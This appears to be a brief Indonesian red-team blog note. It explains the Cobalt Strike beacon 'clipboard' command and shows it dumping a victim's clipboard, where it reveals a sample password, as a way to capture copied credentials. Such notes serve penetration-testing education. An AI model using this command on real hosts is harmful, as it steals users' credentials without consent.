---
title: '[Windows] Clipboard'
date: 2023-07-25 16:57:22 +0700
categories: ['Windows Hacking', 'Host Reconnaissance']
tags: [red team, host reconnaissance, windows hacking, cobalt strike, clipboard]     # TAG names should always be lowercase
author: nairpaa
---

Perintah `clipboard` pada Cobalt Strike akan merekam teks apa pun dari *clipboard* pengguna. Ini bisa berguna untuk mendapatkan kredensial yang sedang di-*copy/paste*.

```bash
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (11 bytes):
Passw0rd123
```